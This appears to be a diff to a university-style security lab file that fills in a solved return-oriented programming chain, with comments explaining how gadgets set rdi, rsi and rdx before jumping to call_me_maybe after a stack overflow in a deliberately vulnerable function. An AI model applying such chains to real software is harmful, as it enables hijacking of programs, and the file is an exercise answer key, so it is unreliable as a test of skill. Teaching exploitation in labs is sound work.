@@ -45,11 +45,23 @@ void lab_code() {
     uint64_t gadget6_addr = (uint64_t)&gadget6;
     uint64_t call_me_maybe_addr = (uint64_t)&call_me_maybe;
 
-    // Part 2B: Fill in your_string such that it configures the arguments
-    // to call_me_maybe correctly, and then calls call_me_maybe.
-
-    // Recall that arg1 is rdi, arg2 is rsi, and arg3 is rdx.
-    // See gadgets.s for the gadget definitions.
+    /*
+     * Goal: reach call_me_maybe(rdi, rsi, rdx) with:
+     *   rdi having bit 1 set,
+     *   rsi == 2 * rdi,
+     *   rdx == 1337.
+     *
+     * ROP chain after the overflow:
+     *   gadget3          => rdi = 0
+     *   gadget5 x3       => rdi = 3
+     *   gadget6          => rsi = rdi = 3
+     *   gadget2          => rsi = 6
+     *   gadget1          => rax = 191 (popped from next stack slot)
+     *   gadget4          => rdx = rax * 7 = 1337
+     *   call_me_maybe    => checks (3, 6, 1337)
+     *
+     * The first three qwords are still padding up to the saved RIP.
+     */
     your_string[0] = 0xFFFFFFFFFFFFFFFF;
     your_string[1] = 0xFFFFFFFFFFFFFFFF;
     your_string[2] = 0xFFFFFFFFFFFFFFFF;
@@ -63,5 +75,6 @@ void lab_code() {
     your_string[10] = gadget4_addr;
     your_string[11] = call_me_maybe_addr;
 
+    // Once vulnerable() returns, execution walks this chain one gadget at a time.
     vulnerable((char *)your_string);
 }
